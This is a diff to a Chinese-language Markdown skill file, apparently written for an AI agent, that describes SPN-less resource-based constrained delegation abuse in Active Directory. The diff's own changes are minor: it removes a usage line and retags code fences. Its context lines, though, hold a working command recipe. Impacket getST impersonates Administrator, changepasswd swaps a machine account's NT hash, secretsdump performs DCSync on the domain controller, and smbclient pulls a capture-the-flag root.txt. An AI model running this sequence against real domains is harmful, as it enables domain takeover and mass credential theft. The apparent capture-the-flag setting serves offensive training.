@@ -1,7 +1,6 @@
 ---
 name: 'rbcd-spnless'
 description: 'SPN-less RBCD：发起账户无 SPN 时 getST -u2u S4U2Proxy BADOPTION 的标准解法（changepasswd -newhashes 改 NT hash = TGT session key）'
-whenToUse: 'RBCD 发起账户无 SPN、getST -u2u 的 S4U2Proxy 报 KDC_ERR_BADOPTION 时使用。'
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
@@ -36,7 +35,7 @@ impacket-getST -additional-ticket 'Administrator@ACCT$@DOM.ccache' \
 # 6. 立即恢复密码/hash
 KRB5CCNAME=ACCT$.ccache impacket-changepasswd 'dom/ACCT$@DC.dom' \
   -newhashes :<OLDHASH> -hashes :<SKEY> -k -no-pass -dc-ip <DC>
-```
+```text
 
 ## 利用 TGS
 ```bash
@@ -45,7 +44,7 @@ impacket-secretsdump -k -no-pass 'dom/Administrator@dc.dom' -dc-ip <DC>   # DCSy
 # 读 flag：impacket-smbclient -k -no-pass 'dom/Administrator@dc.dom' -inputfile cmds.txt
 #   cmds: use C$ / cd Users\Admin\Desktop / get root.txt（get 不能带本地路径参数！）
 # psexec -k 可用但 stdout 不回显；wmiexec 需 HOST SPN
-```
+```text
 
 ## ⚠️ 坑
 - **NTLM 禁用环境**：changepasswd/getST 全部 `-k`（Kerberos）
